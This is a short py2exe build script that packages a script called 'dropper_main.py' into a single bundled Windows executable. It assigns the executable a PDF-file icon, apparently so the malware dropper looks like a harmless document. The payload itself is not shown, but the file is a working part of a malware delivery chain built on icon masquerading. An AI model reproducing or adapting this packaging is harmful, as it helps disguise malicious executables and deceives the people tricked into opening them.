import py2exe
from distutils.core import setup
from glob import glob
data_files = [("Microsoft.VC90.CRT", glob(r'C:\Program Files\Microsoft Visual Studio 9.0\VC\redist\x86\Microsoft.VC90.CRT\*.*'))]

setup(
    data_files=data_files,
    console=[{
            "script": "dropper_main.py",
            "icon_resources": [(0, "file_type_pdf_icon_130274.ico")]
        }],
    options={
        'py2exe': {
            'bundle_files': 1,
            'optimize': 2
        },
    },
)
